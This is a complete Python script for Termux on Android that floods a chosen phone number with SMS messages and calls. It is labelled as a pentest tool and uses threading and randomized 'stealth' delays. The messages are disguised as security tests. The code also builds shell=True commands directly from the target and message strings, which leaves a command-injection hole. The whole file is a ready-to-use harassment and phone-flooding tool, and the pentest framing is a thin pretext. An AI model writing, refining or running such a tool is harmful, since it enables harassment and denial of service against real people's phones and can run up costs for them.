#!/usr/bin/env python3
import subprocess
import time
import random
import argparse
import os
import sys
import threading
from datetime import datetime
import requests  # For webhook notifications

class AdvancedSMSCallSpammer:
    def __init__(self, target, sms=20, calls=10, delay=1.5, stealth=True):
        self.target = target
        self.sms_count = sms
        self.call_count = calls
        self.delay = delay
        self.stealth = stealth
        self.log_file = f"logs/pentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        self.sms_success = 0
        self.call_success = 0
        
    def stealth_delay(self):
        """Randomized stealth delays"""
        if self.stealth:
            return self.delay + random.uniform(0.5, 2.0)
        return self.delay
    
    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        entry = f"[{ts}] {msg}"
        print(entry)
        os.makedirs("logs", exist_ok=True)
        with open(self.log_file, 'a') as f:
            f.write(entry + "\n")
    
    def send_sms(self, msg="Pentest SMS"):
        cmd = f'termux-sms-send -n {self.target} "{msg}"'
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                self.sms_success += 1
                return True
        except:
            pass
        return False
    
    def spam_sms_thread(self):
        """Multi-threaded SMS spam"""
        messages = [
            f"Pentest #{random.randint(1000,9999)}",
            f"Security test {random.randint(1,100)}",
            "API validation",
            f"Load test {random.choice(['A','B','C'])}",
            "SMS gateway check"
        ]
        
        for i in range(self.sms_count):
            msg = random.choice(messages)
            if self.send_sms(msg):
                self.log(f"✅ SMS #{i+1}: {msg[:20]}...")
            time.sleep(self.stealth_delay())
    
    def make_call(self):
        cmd = f'termux-telephony-call {self.target}'
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            time.sleep(random.randint(3,7))  # Random call duration
            self.call_success += 1
            return True
        except:
            pass
        return False
    
    def spam_calls_thread(self):
        for i in range(self.call_count):
            if self.make_call():
                self.log(f"📞 CALL #{i+1} initiated")
            time.sleep(self.stealth_delay() * 3)
    
    def run_full_attack(self):
        self.log(f"🎯 TARGET: {self.target}")
        self.log(f"⚙️  SMS:{self.sms_count} CALLS:{self.call_count} DELAY:{self.delay}s")
        
        # Multi-threaded attack
        sms_thread = threading.Thread(target=self.spam_sms_thread)
        call_thread = threading.Thread(target=self.spam_calls_thread)
        
        sms_thread.start()
        time.sleep(2)
        call_thread.start()
        
        sms_thread.join()
        call_thread.join()
        
        self.log(f"📊 RESULTS: SMS:{self.sms_success}/{self.sms_count} | CALLS:{self.call_success}/{self.call_count}")
        self.log(f"📄 Log saved: {self.log_file}")

def main():
    parser = argparse.ArgumentParser(description="🔥 Advanced SMS/Call Pentest Tool")
    parser.add_argument("target", help="Target number (e.g. +639123456789)")
    parser.add_argument("-s", "--sms", type=int, default=50, help="SMS count")
    parser.add_argument("-c", "--calls", type=int, default=20, help="Call count")
    parser.add_argument("-d", "--delay", type=float, default=1.5, help="Delay (s)")
    parser.add_argument("--no-stealth", action="store_true", help="Disable stealth mode")
    
    args = parser.parse_args()
    
    # Verify Termux API
    try:
        subprocess.run("termux-sms-list", shell=True, capture_output=True, check=True)
    except:
        print("❌ Install Termux:API from F-Droid + grant SMS/Call permissions")
        sys.exit(1)
    
    spammer = AdvancedSMSCallSpammer(
        args.target, args.sms, args.calls, args.delay, stealth=not args.no_stealth
    )
    spammer.run_full_attack()

if __name__ == "__main__":
    main()
